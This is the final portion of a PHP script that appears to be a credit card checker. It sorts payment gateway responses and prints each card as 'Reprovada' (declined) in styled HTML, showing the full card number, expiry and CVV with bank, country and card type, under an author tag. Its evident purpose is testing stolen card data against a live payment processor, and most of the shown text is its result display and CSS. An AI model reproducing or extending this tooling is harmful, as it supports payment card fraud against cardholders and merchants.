elseif (strpos($result2, 'Your cards expiration year is invalid.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Your Card is Expired ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}
elseif (strpos($result2, 'Unknown error generating account.')) {
    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
            Reprovada ❌ $cc|$mes|$ano|$cvv
          </div><br>
          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
            Unknown error generating account OR EXPIRED CARD  ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
          </div><br>
          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
            $bank [$country] - $type
          </div><br>";
}

else {
  echo "
  <!-- Opaque button with glowing edges for Reprovada -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>REPROVADA ❌ $cc|$mes|$ano|$cvv</span>
  </span>
  <br>
  <!-- Opaque button with glowing edges for Other Error -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>Gateway API Error(Error:404) ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧</span>
  </span>
  <br>
  <!-- Opaque button with glowing edges for Bank Info -->
  <span class='custom-button-glow'>
    <span class='glowing-text'>$bank [$country] - $type</span>
  </span>
  <br>
 
  <br>

  <style>
    /* Glowing and color-changing font effect */
    @keyframes glowingTextEffect {
      0% { color: rgb(255, 0, 0); }    /* Red */
      25% { color: rgb(0, 255, 0); }   /* Green */
      50% { color: rgb(0, 0, 255); }   /* Blue */
      75% { color: rgb(255, 255, 0); } /* Yellow */
      100% { color: rgb(255, 0, 255); }/* Pink */
    }

    .glowing-text {
      text-transform: uppercase;
      font-weight: bold;
      animation: glowingTextEffect 3s infinite; /* Color-changing font effect */
      font-size: 14px; /* Smaller font size for the text */
    }

    /* Opaque button with glowing border effect */
    @keyframes glowingBorderEffect {
      0% { box-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0), 0 0 30px rgb(255, 0, 0); }  /* Red */
      25% { box-shadow: 0 0 10px rgb(0, 255, 0), 0 0 20px rgb(0, 255, 0), 0 0 30px rgb(0, 255, 0); } /* Green */
      50% { box-shadow: 0 0 10px rgb(0, 0, 255), 0 0 20px rgb(0, 0, 255), 0 0 30px rgb(0, 0, 255); } /* Blue */
      75% { box-shadow: 0 0 10px rgb(255, 255, 0), 0 0 20px rgb(255, 255, 0), 0 0 30px rgb(255, 255, 0); } /* Yellow */
      100% { box-shadow: 0 0 10px rgb(255, 0, 255), 0 0 20px rgb(255, 0, 255), 0 0 30px rgb(255, 0, 255); } /* Pink */
    }

    .custom-button-glow {
      display: inline-block;
      padding: 5px 10px; /* Reduced padding for smaller buttons */
      border-radius: 5px;
      background-color: rgba(0, 0, 0, 0.8); /* Fixed opaque background */
      animation: glowingBorderEffect 3s infinite; /* Glowing, color-changing border */
      color: white; /* Default text color */
    }
  </style>
  ";
}




curl_close($ch);
ob_flush();
flush();
//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";

?>
